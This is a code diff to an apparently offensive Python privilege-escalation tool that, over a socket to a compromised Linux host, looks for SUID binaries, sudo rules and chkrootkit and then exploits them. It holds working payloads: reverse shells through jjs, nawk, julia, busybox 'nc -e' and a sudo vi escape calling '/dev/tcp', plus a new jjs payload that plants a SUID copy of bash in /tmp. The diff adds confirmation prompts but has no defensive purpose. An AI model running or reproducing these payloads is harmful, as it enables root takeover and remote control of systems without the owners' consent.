@@ -15,12 +15,16 @@ class base:
         self.suid = {
             'pkexec':False,
             'screen':False,
-            'systemctl':False
+            'systemctl':False,
+            'chkrootkit':False
         }
         self.ip = ip
         self.port = port
         self.payloads = {
-            'jjs': self.create_payload('jjs', "echo 'var host=Java.type(\"java.lang.System\").getenv(\"RHOST\"); var port=Java.type(\"java.lang.System\").getenv(\"RPORT\"); var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\"); var p=new ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start(); var Socket = Java.type(\"java.net.Socket\"); var s=new Socket(host,port); var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {{p.exitValue();break;}}catch (e){{}}}};p.destroy();s.close();' | jjs"),
+            'jjs':  (
+        f'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'cp /bin/bash /tmp/bash\').waitFor();'
+        f'Java.type(\'java.lang.Runtime\').getRuntime().exec(\'chmod u+s /tmp/bash\').waitFor();" | jjs'
+    ),
             'nawk': self.create_payload('nawk', "-v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {{ s = \"/inet/tcp/0/\" RHOST \"/\" RPORT; while (1) {{printf \"> \" |& s; if ((s |& getline c) <= 0) break; while (c && (c |& getline) > 0) print $0 |& s; close(c)}}}}'"),
             'julia': self.create_payload('julia', "-e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline($cmd, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'"),
             'busybox': self.create_payload('busybox', "nc -e /bin/sh $RHOST $RPORT"),
@@ -51,7 +55,7 @@ class base:
     def __find_SUID(self, sock):
         core.send_command(sock, 'find / -type f -perm -4000 2>/dev/null')
         response = core.recv_response(sock, 15)
-
+        self.__find_chkrootkit(sock)
         self.print_suid_files(response)
         self.__exploit(sock)
 
@@ -102,6 +106,7 @@ class base:
             if 'systemctl' in file_name:
                     print("[+] systemctl may have a privilege escalation vulnerability!")
                     self.suid['systemctl'] = True
+            
             if file_name in suid_programs:
                 exploitable_files.append(suid_file)
                 if file_name in self.payloads:
@@ -111,15 +116,26 @@ class base:
         for suid_file in exploitable_files:
             print("[+] Exploit => " + base_url + suid_file.split('/')[-1])
 
+    def __find_chkrootkit(self,socks):
+        core.send_command(socks,"which chkrootkit")
+        res = core.recv_response(socks,4)
+        if '/chkrootkit' in res:
+            print("[+] chkrootkit may have a privilege escalation vulnerability!")
+            self.suid['chkrootkit'] = True
+
     def __exploit(self, sock):
         if len(self.available_payload)>0:
             print("[+] Attempt to exploit SUID files...")
             for name in self.available_payload:
+                if input(f"[!] Do you want to exploit the vulnerability in file {name}? (y/n) >").strip().lower() != 'y':
+                    continue
                 print("[+] Exploiting:", name)
                 core.send_command(sock, self.payloads[name])
+                if 'jjs' in name:
+                    print("[+] Payload => /tmp/bash -p")
                 print("[+] Exploitation completed....")
         else:
-            print("[-] No exploits available")
+            print("[-] No SUID files available for exploitation")
 
 
     def __SUDO_file(self, socks, password=None):
@@ -146,6 +162,8 @@ class base:
                     path = ' '.join(parts[1:])
 
                     if 'vi' in command:
+                        if input(f"[!] Do you want to exploit the vulnerability in command 'vi' ? (y/n) >").strip().lower() != 'y':
+                            continue
                         payload = f"sudo {command} {path} -c ':!/bin/bash -c \"/bin/bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1\"' /dev/null"
                         print(f"[+] SUDO file privilege escalation payload => {payload}")
                         core.send_command(socks, payload)
@@ -155,11 +173,14 @@ class base:
                 else:
                     print(f"[-] Unexpected format in sudo output: {match}")
         else:
-            print("[-] No exploitable sudo commands found.")
+            print("[-] No SUDO command privilege escalation vulnerabilities.")
 
     def check(self, sock,password=None):
+        print("[*] Retrieving SUID files")
         self.__find_SUID(sock)
+        print("[*] Retrieving SUDO files")
         self.__SUDO_file(sock,password)
+        print("[-] Basic module detection completed")
         return self.suid
 
 
